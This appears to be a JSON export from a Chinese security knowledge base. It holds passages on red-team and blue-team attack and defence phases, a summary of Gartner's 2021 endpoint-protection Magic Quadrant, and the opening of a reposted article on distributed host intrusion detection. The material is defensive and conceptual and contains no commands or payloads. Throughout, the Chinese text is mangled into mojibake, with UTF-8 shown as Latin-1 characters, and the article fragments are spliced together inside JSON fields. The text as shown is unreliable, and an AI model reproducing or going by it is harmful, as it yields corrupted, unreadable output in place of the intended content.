ã€å…³é—­ä¸å¿…è¦çš„ä¸šåŠ¡ã€æœåŠ¡å’Œç«¯å£ã€å¸¸æ€åŒ–åŠ¨æ€åŒ–å®æ—¶æ·±åº¦ç›‘æµ‹ã€è¯†åˆ«å—…æ¢è€…å·¥å…·ã€æ¸…æ¥šæš´éœ²é¢ä»¥åŠå®æ—¶æ›´æ–°å¼±ç‚¹é—®é¢˜åŠæ—¶åŠ å›ºã€å®‰å…¨ç»„ç»‡å¸¸æ€åŒ–ã€æ„è¯†åŸ¹è®­å¸¸æ€åŒ–ç­‰ã€‚\r\n\r\n![BDKbIk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/BDKbIk.jpg)\r\n\r\nå›¾è§£ï¼šçº¢è“æ”»å®ˆåŒæ–¹å›´ç»•ä¿æŠ¤å¯¹è±¡ï¼ˆç¥ç»ä¸­æ¢é¶æ ‡ï¼‰è¿›è¡Œæ”»å‡»ä¸é˜²å¾¡ç­–ç•¥åˆ¶å®šåï¼Œç¬¬ä¸€æ­¥åŒæ–¹å¼€å±•çš„åˆ™æ˜¯æ”»å‡»é¢åˆ†æä¸æš´éœ²é¢æ”¶æ•›ï¼Œç¬¬äºŒæ­¥è¿›å…¥åˆ°è¾¹ç•Œçªç ´/é˜²å®ˆé˜¶æ®µã€‚\r\n\r\né‡ç‚¹ï¼šæ”»å‡»æ–¹æ ¹æ®æ”»å‡»é¢åˆ†æä¸æ”»å‡»æ–¹æ¡ˆæ¨æ¼”ï¼Œæ´æ‚‰å¯ä»¥åˆ©ç”¨çš„å„ç§æ¼æ´ï¼Œè¿›è¡Œæ”»å‡»è·¯å¾„çš„é€‰æ‹©ã€æ¸—é€ä¸çªç ´ã€‚è¾¹ç•Œçªç ´åˆ©ç”¨çš„æ”»å‡»æ‰‹æ®µå°†ä¼šæ˜¯å¤šç§å¤šæ ·ï¼Œç›®çš„å°±æ˜¯æ’•å¼€é¶æ ‡çš„æœ€å¤–å±‚é˜²å¾¡ç³»ç»Ÿï¼Œçªç ´çš„ç‚¹å¾€å¾€æ˜¯å¸¸ä»¤äººç–å¿½çš„æˆ–éš¾äºç®¡ç†çš„åœ°æ–¹ã€‚é˜²å®ˆæ–¹æ„è¯†æ˜¯ç¬¬ä¸€ä½çš„ã€åº”æ¸…æ™°äº†è§£è‡ªèº«çš„è¾¹ç•Œé˜²å¾¡æƒ…å†µï¼Œäº†è§£çŸ­æ¿ï¼Œåšå¥½ç¬¬ä¸€é“é˜²çº¿ï¼Œå¼€å±•ç®¡ç†ã€æŠ€æœ¯ã€è¿è¥ä½“ç³»è½åœ°å»ºè®¾ä¸è¿è¥ï¼›\r\n\r\næ”»å‡»ï¼šæ¼æ´åˆ©ç”¨ã€è‡ªåŠ¨åŠæ‰‹å·¥æ¸—é€ã€å­—å…¸æ”»å‡»ã€å£ä»¤çˆ†ç ´ã€DDOSã€åé—¨ã€é’“é±¼ç­‰\r\n\r\né˜²å®ˆï¼šå¤šå› ç´ è®¤è¯ã€è®¿é—®æ§åˆ¶ã€åŒå†—ä½™ã€å¼‚æ„ã€webç›‘æµ‹åŠé˜²å¾¡ã€èœœç½ã€æµé‡ç›‘æµ‹ä¸æ¸…æ´—ã€æ¶æ„ä»£ç é˜²æŠ¤ã€å…¥ä¾µç›‘æµ‹ä¸é˜²æŠ¤ã€å®æ—¶å¼±ç‚¹ç›‘æ§ä¸åŠ å›ºã€ç‰¹æƒç”¨æˆ·ç®¡æ§ã€å¼±å£ä»¤ç­–ç•¥åŠæ¸…ç†ã€æ¸…é™¤å†—ä½™å®‰å…¨ç­–ç•¥ã€å¨èƒæƒ…æŠ¥ã€æ”»å‡»æº¯æºç­‰ã€‚\r\n\r\n![xPCr9d](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/xPCr9d.jpg)\r\n\r\nå›¾è§£ï¼šçº¢è“æ”»å®ˆåŒæ–¹å›´ç»•ä¿æŠ¤å¯¹è±¡ï¼ˆç¥ç»ä¸­æ¢é¶æ ‡ï¼‰è¿›è¡Œæ”»å‡»ä¸é˜²å¾¡ç­–ç•¥åˆ¶å®šåï¼Œç¬¬ä¸€æ­¥åŒæ–¹å¼€å±•çš„åˆ™æ˜¯æ”»å‡»é¢åˆ†æä¸æš´éœ²é¢æ”¶æ•›ï¼Œç¬¬äºŒæ­¥è¿›å…¥åˆ°è¾¹ç•Œçªç ´/é˜²å®ˆé˜¶æ®µï¼Œæ¸—é€æˆåŠŸå°†è¿›å…¥ç¬¬ä¸‰æ­¥æ¨ªå‘æ¸—é€å’ŒåŒºåŸŸæ§åˆ¶çš„è¾ƒé‡é˜¶æ®µï¼›\r\n\r\né‡ç‚¹ï¼šæ”»å‡»æ–¹çªç ´è¾¹ç•Œé˜²æŠ¤çš„æ¦‚ç‡æ˜¯å’Œé˜²å®ˆæ–¹é˜²å¾¡æˆç†Ÿåº¦æœ‰å¾ˆå¤§å…³ç³»ï¼Œçªç ´ç¬¬ä¸€é“é˜²çº¿ä»¥åæ”»å‡»æ–¹ä¸€æ–¹é¢ä¼šå°½å¯èƒ½çš„ä¼ªè£…è‡ªå·±ï¼ŒåŒæ—¶åœ¨é»‘æš—å¤„æŒç»­å¯»æ‰¾ä¸‹ä¸€æ­¥è¿›æ”»è·¯å¾„å’Œè·³æ¿ï¼Œé˜²å®ˆæ–¹ä¸¢å¤±ç¬¬ä¸€é˜²çº¿å…¶å®è¿˜ä¸ç®—å¯æ€•ï¼Œè™½ç„¶å½¢åŠ¿éå¸¸ä¸¥å³»å’Œè¢«åŠ¨ï¼Œå¦‚æœæ·±åº¦ç›‘æµ‹æ£€æµ‹æ–¹æ³•æœ‰æ•ˆã€å®‰å…¨åŸŸæ§ç­–ç•¥å’ŒåŠ å›ºåšçš„åˆ°ä½ï¼Œè¿˜å¯ä»¥åŠæ—¶å‘ç°æ¸—é€æ¨ªå‘ç§»åŠ¨çš„å¼‚å¸¸è¡Œä¸ºï¼Œè‡´ä½¿æ”»å‡»æ–¹åªèƒ½çŸ­æœŸè¿›å…¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¼ºå¤§çš„åŒºåŸŸæ§åˆ¶ç­–ç•¥å’Œæ‰‹æ®µï¼Œåœ¨ç¬¬ä¸‰é˜¶æ®µå–å¾—èƒœåˆ©ï¼›\r\n\r\næ”»å‡»ï¼šæ¼æ´åˆ©ç”¨ã€è‡ªåŠ¨åŠæ‰‹å·¥æ¸—é€ã€å­—å…¸æ”»å‡»ã€å£ä»¤çˆ†ç ´ã€ææƒæ”»å‡»ç­‰ï¼›\r\n\r\né˜²å®ˆï¼šå®‰å…¨åŸŸåˆ†å±‚åˆ’åˆ†ã€åŸŸè®¿é—®åˆ¶å®šå¼ºæ§åˆ¶ç­–ç•¥ã€æ¸…é™¤å†—ä½™ç­–ç•¥ã€å†…éƒ¨è´¦å·å¼ºè®¤è¯ä¸ç›‘æ§ã€åˆ†å±‚åŒºåŸŸè¾¹ç•Œå¼‚æ„ã€å®æ–½æ·±åº¦æµé‡ç›‘æµ‹ä¸é¢„è­¦ã€æ¶æ„ä»£ç é˜²æŠ¤å¼‚æ„ã€å®æ–½å¯ä¿¡ã€å®æ—¶å¼±ç‚¹ç›‘æ§ä¸åŠ å›ºã€ç‰¹æƒç”¨æˆ·ç®¡æ§ã€å¼±å£ä»¤ç­–ç•¥åŠæ¸…ç†ã€æ¸…é™¤å†—ä½™å®‰å…¨ç­–ç•¥ç­‰ã€‚\r\n\r\n![8Kdwr5](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/8Kdwr5.jpg)\r\n\r\nå›¾è§£ï¼šçº¢è“æ”»å®ˆåŒæ–¹å›´ç»•ä¿æŠ¤å¯¹è±¡ï¼ˆç¥ç»ä¸­æ¢é¶æ ‡ï¼‰è¿›è¡Œæ”»å‡»ä¸é˜²å¾¡ç­–ç•¥åˆ¶å®šåï¼Œç¬¬ä¸€æ­¥åŒæ–¹å¼€å±•çš„åˆ™æ˜¯æ”»å‡»é¢åˆ†æä¸æš´éœ²é¢æ”¶æ•›ï¼Œç¬¬äºŒæ­¥è¿›å…¥åˆ°è¾¹ç•Œçªç ´/é˜²å®ˆé˜¶æ®µï¼Œç¬¬ä¸‰æ­¥æ¨ªå‘æ¸—é€å’ŒåŒºåŸŸæ§åˆ¶åå¦‚æœåŸŸæ§å¤±é™·ï¼Œå°±å°†è¿›å…¥æ ¸å¿ƒè¾ƒé‡çš„ç¬¬å››æ­¥ç¥ç»ä¸­æ¢é¶æ ‡æ”»é™·/å¼ºæ§é˜¶æ®µï¼›\r\n\r\né‡ç‚¹ï¼šæ”»å‡»æ–¹ä¸€æ—¦çªç ´åŸŸæ§ï¼Œä¸€èˆ¬æ‹¿ä¸‹æ ¸å¿ƒé¶æ ‡ä¸ä¼šé¥è¿œï¼Œè™½ç„¶è¿™ä¸ªè¿‡ç¨‹å¾€å¾€éœ€è¦æœ‰è¾ƒé•¿çš„ä¸€æ®µæ—¶é—´ï¼Œä½†ç¡®å®å·²åˆ°äº†å…³é”®æ—¶åˆ»ï¼Œå¦‚æœè¿™ä¸ªæ—¶å€™é˜²å®ˆæ–¹è¿˜æ²¡æœ‰ç›‘æµ‹å‘ç°ï¼Œæ ¸å¿ƒé¶æ ‡è¢«æ”»é™·çš„æ¦‚ç‡å‡ ä¹æ˜¯100%ï¼Œä½†å¹¶ä¸æ˜¯å®Œå…¨æ²¡æœ‰æœºä¼šï¼Œé˜²å®ˆæ–¹å¦‚æœåœ¨ä¸€äº›æ ¸å¿ƒç‚¹åšå¥½ï¼Œè™½ç„¶è‚¯å®šæœ‰è¾ƒå¤§æŸå¤±ï¼Œä½†è¿˜å¯ä»¥ä¿æŠ¤å¥½æ ¸å¿ƒç¥ç»ä¸­æ¢é¶æ ‡ä¸è¢«æ”»é™·ï¼›\r\n\r\næ”»å‡»ï¼šæ¼æ´åˆ©ç”¨ã€è‡ªåŠ¨åŠæ‰‹å·¥æ¸—é€ã€å­—å…¸æ”»å‡»ã€å£ä»¤çˆ†ç ´ã€ææƒæ”»å‡»ç­‰ï¼›\r\n\r\né˜²å®ˆï¼šå®æ—¶æ·±åº¦æµé‡ç›‘æµ‹ä¸é¢„è­¦ã€å®æ—¶å¼±ç‚¹ç›‘æ§ä¸åŠ å›ºã€å¼ºæ§ç‰¹æƒç”¨æˆ·ã€å…³é—­é¶æ ‡ä¸å¿…è¦çš„æœåŠ¡å’Œç«¯å£ï¼Œå®æ–½å¯ä¿¡é»‘ç™½åå•å¼ºç­–ç•¥ã€æ¸…é™¤é¶æ ‡ä¸å¿…è¦çš„ç”¨æˆ·ã€å¼ºåŒ–é¶æ ‡å¤šå› ç´ è®¤è¯å’Œå¢å¼ºå£ä»¤å¼ºåº¦ç­‰ã€‚\r\n\r\n![JjsGbo](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/JjsGbo.jpg)\r\n\r\nå›¾è§£ï¼šç»¼ä¸Šæ‰€è¿°ï¼Œæ”»å‡»æ–¹ä¸ä¼šè€—è´¹å¤§é‡èµ„æºå’Œç²¾åŠ›å»æ”»å‡»æ²¡æœ‰ä»·å€¼çš„ç³»ç»Ÿï¼Œé˜²å®ˆæ–¹çš„é˜²å¾¡æ€è·¯ä»è¢«åŠ¨åˆ°ä¸»åŠ¨ã€ä»è¾¹ç•Œåˆ°çºµæ·±ã€ä»åŸºç¡€ä¿æŠ¤è¸å®åšèµ·ï¼ˆæ˜ç¡®ä¿æŠ¤å¯¹è±¡ã€æš´éœ²é¢è¿›è¡Œæ”¶æ•›ã€å¤šå› ç´ è®¤è¯ã€è®¿é—®ç­–ç•¥è½åœ°æ¸…æ™°ã€å®æ—¶æ·±åº¦ç›‘æµ‹å’Œåšå¥½å¯ä¿¡åŠ å›ºã€ç®¡ç†å¥½ç”¨æˆ·ä¿¡æ¯ã€å¼ºç®¡æ§ç‰¹æƒç”¨æˆ·ï¼Œæœç»å¼±å£ä»¤ç­‰ã€ä»¥åˆè§„ä¸ºåŸºç¡€ï¼Œå®Œæˆç®¡ç†ã€æŠ€æœ¯å’Œè¿ç»´ä½“ç³»åŸºæœ¬è¦æ±‚ï¼‰ï¼Œå›´ç»•é‡ç‚¹å’Œå…³é”®ç¯èŠ‚ï¼Œè¿›è¡Œå¼ºåŒ–ä¿æŠ¤å»ºè®¾\r\n\r\nï¼ˆå®‰å…¨ç­–ç•¥ä¸€ä½“åŒ–ã€æ·±åº¦ç›‘æµ‹ä¸æº¯æºã€æ·±åº¦å®æ—¶ç›‘æµ‹ã€æ—¥å¸¸åŠ å¼ºæ¼”ç»ƒå’Œæ¨æ¼”ã€å»ºç«‹æ¸…æ™°çš„å…¨é‡å’ŒåŠ¨æ€çš„èµ„äº§åº“ã€å»ºç«‹å®Œæ•´å’Œå®æ—¶çš„é£é™©åº“ã€å»ºç«‹è¾ƒä¸ºå…¨é¢çš„èƒ½åŠ›åº“ï¼Œå»ºè®¾å®‰å…¨è¿è¥ä¸€ä½“åŒ–ä¸­å¿ƒï¼Œå®ç°é˜²å¾¡ã€æ£€æµ‹ã€é¢„æµ‹å’Œå“åº”æ ¸å¿ƒå…³é”®ç¯èŠ‚çš„IDã€IPã€ACTçš„åŠ¨æ€çš„å¼‚å¸¸çš„ç²¾å‡†ç›‘æ§å’Œåˆ†æï¼Œè¿›è¡Œç²¾å‡†å“åº”å’Œé˜²å¾¡ï¼‰ï¼Œåœ¨å¤§è§„æ¨¡æ”»å‡»å’Œç´§æ€¥äº‹ä»¶çš„å‘ç”Ÿæ—¶ï¼Œå¯ä»¥è°ƒé›†è¿è¥è€…è‡ªèº«ã€è¡Œä¸šå•ä½ã€æ°‘é—´åŠ›é‡ã€ç›‘ç®¡å•ä½å¼€å±•ååŒä¿æŠ¤ï¼ˆä¿¡æ¯å…±äº«å’ŒæŒ‡æŒ¥ååŒï¼‰ã€‚\r\n\r\n# æ¥æº\r\n\r\n- [https://mp.weixin.qq.com/s?__biz=MzIwNTA0NTUxMg%3D%3D&chksm=9737a694a0402f82057a86441c298fe32c0cdf01c7536e1e1eb30c99dc9fdc777ef21604aa61&idx=1&mid=2247486707&scene=21&sn=8f3a8b65cce01d0e14dbb1fe76d611ab#wechat_redirect](https://mp.weixin.qq.com/s?__biz=MzIwNTA0NTUxMg%3D%3D&chksm=9737a694a0402f82057a86441c298fe32c0cdf01c7536e1e1eb30c99dc9fdc777ef21604aa61&idx=1&mid=2247486707&scene=21&sn=8f3a8b65cce01d0e14dbb1fe76d611ab#wechat_redirect)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç»ˆç«¯åŸºç¡€è®¾æ–½/EDR/2021 EPPé­”åŠ›è±¡é™ EPP Magic Quadrant/","title":"2021 EPPé­”åŠ›è±¡é™ EPP Magic Quadrant"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 2021 EPPé­”åŠ›è±¡é™ EPP Magic Quadrant\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- ç»ˆç«¯åŸºç¡€è®¾æ–½\r\n- EDR\r\n---\r\n\r\n![https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ZP3Qyi.jpg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/ZP3Qyi.jpg)\r\n\r\n# 1. å¸‚åœºè¶‹åŠ¿\r\n- åˆ° 2023 å¹´åº•ï¼Œäº‘äº¤ä»˜çš„ EPP è§£å†³æ–¹æ¡ˆå°†è¶…è¿‡ 95% ã€‚\r\n- åˆ° 2025 å¹´ï¼Œ50% ä½¿ç”¨ EDR çš„ç»„ç»‡å°†ä½¿ç”¨æ‰˜ç®¡æ£€æµ‹å’Œå“åº”åŠŸèƒ½ï¼ˆMDRï¼‰ã€‚\r\n- åˆ° 2025 å¹´ï¼Œ60% çš„ EDR è§£å†³æ–¹æ¡ˆå°†åŒ…å«æ¥è‡ªå¤šä¸ªå®‰å…¨æ§åˆ¶æºçš„æ•°æ®ï¼Œä¾‹å¦‚èº«ä»½è®¤è¯ã€CASB å’Œ DLPã€‚\r\n\r\n# 2. å¸‚åœºå®šä¹‰/æè¿°\r\n- Gartnerå¯¹EPPå¸‚åœºçš„å®šä¹‰å¦‚ä¸‹ï¼šEPPæä¾›äº†å°†agentæˆ–sensoréƒ¨ç½²åˆ°æ‰˜ç®¡ç»ˆç«¯ï¼ˆåŒ…æ‹¬ PCã€æœåŠ¡å™¨å’Œå…¶ä»–è®¾å¤‡ï¼‰çš„å·¥å…·ï¼›è¿™äº›æ—¨åœ¨é˜²æ­¢ä¸€ç³»åˆ—å·²çŸ¥å’ŒæœªçŸ¥çš„æ¶æ„è½¯ä»¶å’Œå¨èƒï¼Œå¹¶æä¾›å…å—æ­¤ç±»å¨èƒçš„ä¿æŠ¤ï¼›æ­¤å¤–ï¼Œå®ƒä»¬è¿˜æä¾›è°ƒæŸ¥å’Œè¡¥æ•‘ä»»ä½•é€ƒé¿ä¿æŠ¤æ§åˆ¶çš„äº‹ä»¶çš„èƒ½åŠ›ã€‚\r\n- EPPçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯ï¼š\r\n  - é¢„é˜²å’Œä¿æŠ¤å®‰å…¨å¨èƒï¼ŒåŒ…æ‹¬ä½¿ç”¨åŸºäºæ–‡ä»¶å’Œæ— æ–‡ä»¶æ¼æ´çš„æ¶æ„è½¯ä»¶ã€‚\r\n  - å°†æ§åˆ¶ï¼ˆå…è®¸/é˜»æ­¢ï¼‰åº”ç”¨äºè½¯ä»¶ã€è„šæœ¬å’Œè¿›ç¨‹çš„èƒ½åŠ› ã€‚\r\n  - ä½¿ç”¨å¯¹è®¾å¤‡æ´»åŠ¨ã€åº”ç”¨ç¨‹åºå’Œç”¨æˆ·æ•°æ®çš„è¡Œä¸ºåˆ†ææ¥æ£€æµ‹å’Œé¢„é˜²å¨èƒçš„èƒ½åŠ› ã€‚\r\n  - å½“æ¼æ´åˆ©ç”¨é€ƒé¿ä¿æŠ¤æ§åˆ¶æ—¶è¿›ä¸€æ­¥è°ƒæŸ¥äº‹ä»¶å’Œ/æˆ–è·å¾—è¡¥æ•‘æŒ‡å¯¼çš„è®¾æ–½ ã€‚\r\n- EPPä¸­ç»å¸¸å‡ºç°çš„å¯é€‰åŠŸèƒ½å¯èƒ½åŒ…æ‹¬ï¼š\r\n  - ç»ˆç«¯è®¾å¤‡çš„èµ„äº§ã€é…ç½®å’Œç­–ç•¥ç®¡ç†çš„æ”¶é›†å’ŒæŠ¥å‘Š ã€‚\r\n  - ç£ç›˜åŠ å¯†ã€æœ¬åœ°é˜²ç«å¢™è®¾ç½®ç­‰æ“ä½œç³»ç»Ÿå®‰å…¨æ§åˆ¶çŠ¶æ€çš„ç®¡ç†å’ŒæŠ¥å‘Š ã€‚\r\n  - æ‰«æç³»ç»Ÿæ¼æ´å’ŒæŠ¥å‘Š/ç®¡ç†å®‰å…¨è¡¥ä¸å®‰è£…çš„è®¾æ–½ ã€‚\r\n  - èƒ½å¤ŸæŠ¥å‘Šäº’è”ç½‘ã€ç½‘ç»œå’Œåº”ç”¨ç¨‹åºæ´»åŠ¨ï¼Œä»¥è·å¾—æ½œåœ¨æ¶æ„æ´»åŠ¨çš„å…¶ä»–è¿¹è±¡ ã€‚\r\n\r\n# 3. å¸‚åœºæ¦‚è§ˆ\r\n- å‹’ç´¢è½¯ä»¶ç›®å‰æ˜¯æ‰€æœ‰ç»„ç»‡é¢ä¸´çš„æœ€å¤§é£é™©ã€‚\r\n- è¿œç¨‹åŠå…¬æ˜¾è‘—åŠ é€Ÿäº†åŸºäºäº‘çš„è§£å†³æ–¹æ¡ˆè½åœ°ï¼ˆå­˜é‡å 60%ï¼Œå¢é‡å 95%ï¼‰ã€‚\r\n- æ— æ–‡ä»¶æ”»å‡»å·²ç»éå¸¸æ™®åŠï¼Œä½¿å¾—åŸºäºè¡Œä¸ºçš„æ£€æµ‹é˜²æŠ¤æˆä¸ºEDRå·¥å…·çš„å…³é”®èƒ½åŠ›ã€‚\r\n- é‡‡ç”¨EDRå·¥å…·çš„æœ€å¤§éšœç¢ä»ç„¶æ˜¯æ“ä½œå®ƒä»¬æ‰€éœ€çš„æŠ€èƒ½å’Œå¢åŠ çš„æ€»æˆæœ¬ã€‚\r\n- ä¸ºäº†ç¼©å°æŠ€èƒ½å·®è·ï¼Œæä¾›ç›‘æ§å’Œè­¦æŠ¥åˆ†ç±»çš„MDRæœåŠ¡æ­£å˜å¾—è¶Šæ¥è¶Šæµè¡Œã€‚\r\n- SolarWindsä¾›åº”é“¾æ”»å‡»è¯´æ˜äº†EDRçš„ä»·å€¼å’Œç¼ºç‚¹ï¼›EDRå¹¶æ²¡æœ‰å®æ—¶æ£€æµ‹åˆ°SolarWindsæ”»å‡»ï¼Œä½†åœ¨é˜»æ­¢æ–°å‘ç°çš„æ¶æ„è¡Œä¸ºéå¸¸æœ‰ç”¨ã€‚\r\n- SolarWinds æ”»å‡»è¿˜è¡¨æ˜éœ€è¦è‡³å°‘æ›´å¥½åœ°é›†æˆæ¥è‡ªèº«ä»½å’Œç”µå­é‚®ä»¶çš„é¥æµ‹æ•°æ®ï¼Œä»¥åŠéœ€è¦æœ‰æ•ˆçš„ç¯¡æ”¹ä¿æŠ¤ä»¥ç¡®ä¿ä»£ç†ä¸è¢«ç¦ç”¨ã€‚\r\n- XDRæ­£åœ¨æˆä¸ºEPPè§£å†³æ–¹æ¡ˆçš„æœ€æ–°å…³é”®åŠŸèƒ½ã€‚\r\n- æ‰€æœ‰ç»„ç»‡éƒ½éœ€è¦ä¼˜å…ˆçº§æ›´é«˜çš„åŠ å›ºæŒ‡å¯¼ã€‚\r\n- EPPè§£å†³æ–¹æ¡ˆè¿˜å¯ä»¥æ·»åŠ ç§»åŠ¨ç«¯çš„å¨èƒé˜²å¾¡å’Œä¸ç»Ÿä¸€ç»ˆç«¯ç®¡ç†çš„é›†æˆï¼Œä»¥å‡å°‘æ•´ä½“ç®¡ç†è´Ÿæ‹…ã€‚\r\n\r\n# 4. å‡†å…¥å‡†å‡ºåŸåˆ™\r\n- æ‰€æœ‰ä¾›åº”å•†å¿…é¡»è‡³å°‘æä¾›ä»¥ä¸‹12é¡¹ï¼š\r\n  - æ— éœ€æ›´æ–°è§„åˆ™å³å¯é˜²å¾¡ã€‚\r\n  - å¯ä»¥æ ¹æ®è¿›ç¨‹è¡Œä¸ºæ£€æµ‹æ¶æ„æ´»åŠ¨ã€‚\r\n  - å¯ä»¥å°†IOC/IOAæ•°æ®é›†ä¸­å­˜å‚¨åˆ†æã€‚\r\n  - èƒ½å¤Ÿæ£€æµ‹é˜²å¾¡æ— æ–‡ä»¶æ¶æ„æ–‡ä»¶çš„æ”»å‡»ã€‚\r\n  - æ£€æµ‹åˆ°æ¶æ„è½¯ä»¶æ—¶è‡ªåŠ¨åˆ é™¤æ¶æ„è½¯ä»¶ï¼Œåˆ é™¤/éš”ç¦»æ–‡ä»¶/ç»ˆæ­¢è¿›ç¨‹ã€‚\r\n  - èƒ½å¤Ÿåœ¨æ§åˆ¶å°å‹åˆ¶/å¿½ç•¥è¯¯æŠ¥ã€‚\r\n  - EPPæ§åˆ¶å°å¿…é¡»æ˜¯åŸºäºäº‘çš„SaaSæœåŠ¡ï¼Œç”±ä¾›åº”å•†ç®¡ç†ç»´æŠ¤ã€‚\r\n  - æ§åˆ¶å°å’ŒæŠ¥å‘Šèƒ½å¤Ÿæ˜¾ç¤ºå®Œæ•´çš„è¿›ç¨‹æ ‘ï¼Œä»¥è¯†åˆ«è¿›ç¨‹æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œå¹¶è¿›è¡Œå¯æ“ä½œçš„æ ¹æœ¬åŸå› åˆ†æã€‚\r\n  - éœ€æä¾›å¨èƒç‹©çŒèƒ½åŠ›ï¼Œæ§åˆ¶å°æä¾›è·¨ç»ˆç«¯çš„IOC/IOAï¼ˆå¦‚æ–‡ä»¶å“ˆå¸Œã€æº/ç›®æ ‡ IPã€æ³¨å†Œè¡¨é¡¹ï¼‰æœç´¢ã€‚\r\n  - èƒ½å¤Ÿè¯†åˆ«æ¶æ„è½¯ä»¶å¹¶ç»™å‡ºä¿®å¤æ­¥éª¤æˆ–è€…å®ç°å›æ»šã€‚\r\n  - æä¾›é€‰é¡¹å°†å¨èƒæƒ…æŠ¥é›†æˆåˆ°ç®¡ç†æ§åˆ¶å°ä¸­ã€‚\r\n  - èƒ½å¤Ÿé˜²æŠ¤å¸¸è§åº”ç”¨ç¨‹åºæ¼æ´å’Œå†…å­˜åˆ©ç”¨æ”»å‡»ã€‚\r\n  - å½“ç»ˆç«¯è®¾å¤‡ä½äºå…¬å¸ç½‘ç»œä¹‹å¤–æ—¶ï¼Œå¿…é¡»ç»§ç»­æ”¶é›†å¯ç–‘äº‹ä»¶æ•°æ®ã€‚\r\n  - èƒ½å¯¹æ–‡ä»¶å¤¹ã€é©±åŠ¨å™¨æˆ–è®¾å¤‡ï¼ˆä¾‹å¦‚ USB é©±åŠ¨å™¨ï¼‰æ‰§è¡Œé™æ€ã€æŒ‰éœ€æ¶æ„è½¯ä»¶æ£€æµ‹æ‰«æã€‚\r\n  - æ‰€æœ‰åŠŸèƒ½éƒ½å¿…é¡»åœ¨å•ä¸ªagent/sensorä¸­æä¾›æˆ–ç›´æ¥é›†æˆåˆ°æ“ä½œç³»ç»Ÿä¸­ã€‚\r\n\r\n# 5. å‚è€ƒèµ„æ–™\r\n- [https://www.gartner.com/doc/reprints?ct=210506&id=1-25Z4TEJM&st=sb](https://www.gartner.com/doc/reprints?ct=210506&id=1-25Z4TEJM&st=sb)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/ç»ˆç«¯åŸºç¡€è®¾æ–½/EDR/ä¿éšœIDCå®‰å…¨ï¼šåˆ†å¸ƒå¼HIDSé›†ç¾¤æ¶æ„è®¾è®¡/","title":"ä¿éšœIDCå®‰å…¨ï¼šåˆ†å¸ƒå¼HIDSé›†ç¾¤æ¶æ„è®¾è®¡"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: ä¿éšœIDCå®‰å…¨ï¼šåˆ†å¸ƒå¼HIDSé›†ç¾¤æ¶æ„è®¾è®¡\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- ç»ˆç«¯åŸºç¡€è®¾æ–½\r\n- EDR\r\n---\r\n\r\n# 1. è½¬è½½è‡ªç¾å›¢æŠ€æœ¯å›¢é˜Ÿ\r\n- [https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html](https://tech.meituan.com/2019/01/17/distributed-hids-cluster-architecture-design.html)\r\n\r\n# 2. èƒŒæ™¯\r\nè¿‘å¹´æ¥ï¼Œäº’è”ç½‘ä¸Šå®‰å…¨äº‹ä»¶é¢‘å‘ï¼Œä¼ä¸šä¿¡æ¯å®‰å…¨è¶Šæ¥è¶Šå—åˆ°é‡è§†ï¼Œè€ŒIDCæœåŠ¡å™¨å®‰å…¨åˆæ˜¯çºµæ·±é˜²å¾¡ä½“ç³»ä¸­çš„é‡è¦ä¸€ç¯ã€‚ä¿éšœIDCå®‰å…¨ï¼Œå¸¸ç”¨çš„æ˜¯åŸºäºä¸»æœºå‹å…¥ä¾µæ£€æµ‹ç³»ç»ŸHost-based Intrusion Detection Systemï¼Œå³HIDSã€‚åœ¨HIDSé¢å¯¹å‡ åä¸‡å°ç”šè‡³ä¸Šç™¾ä¸‡å°è§„æ¨¡çš„IDCç¯å¢ƒæ—¶ï¼Œç³»ç»Ÿæ¶æ„è¯¥å¦‚ä½•è®¾è®¡å‘¢ï¼Ÿå¤æ‚çš„æœåŠ¡å™¨ç¯å¢ƒï¼Œç½‘ç»œç¯å¢ƒï¼Œå·¨å¤§çš„æ•°æ®é‡ç»™æˆ‘ä»¬å¸¦æ¥äº†å“ªäº›æŠ€æœ¯æŒ‘æˆ˜å‘¢ï¼Ÿ\r\n\r\n# 3. éœ€æ±‚æè¿°\r\nå¯¹äºHIDSäº§å“ï¼Œæˆ‘ä»¬å®‰å…¨éƒ¨é—¨çš„äº§å“ç»ç†æå‡ºäº†ä»¥ä¸‹éœ€æ±‚ï¼š\r\n\r\n- æ»¡è¶³50W-100WæœåŠ¡å™¨é‡çº§çš„IDCè§„æ¨¡ã€‚\r\n- éƒ¨ç½²åœ¨é«˜å¹¶å‘æœåŠ¡å™¨ç”Ÿäº§ç¯å¢ƒï¼Œè¦æ±‚Agentä½æ€§èƒ½ä½æŸè€—ã€‚\r\n- å¹¿æ³›çš„éƒ¨ç½²å…¼å®¹æ€§ã€‚\r\n- åå‘åº”ç”¨å±‚å’Œç”¨æˆ·æ€å…¥ä¾µæ£€æµ‹ï¼ˆå¯ä»¥å’Œå†…æ ¸æ€æ£€æµ‹éƒ¨åˆ†è§£è€¦ï¼‰ã€‚\r\n- é’ˆå¯¹åˆ©ç”¨ä¸»æœºAgentæ’æŸ¥æ¼æ´çš„æœ€æ€¥éœ€åœºæ™¯æä¾›åŸºæœ¬çš„èƒ½åŠ›ï¼Œå¯ä»¥å®ç°æµ·é‡ç¯å¢ƒä¸‹å¿«é€ŸæŸ¥æ‰¾ç³»ç»Ÿæ¼æ´ã€‚\r\n- Agentè·ŸServerçš„é…ç½®ä¸‹å‘é€šé“å®‰å…¨ã€‚\r\n- é…ç½®ä¿¡æ¯è¯»å–å†™å…¥éœ€è¦é‰´æƒã€‚\r\n- é…ç½®å˜æ›´å†å²è®°å½•ã€‚\r\n- 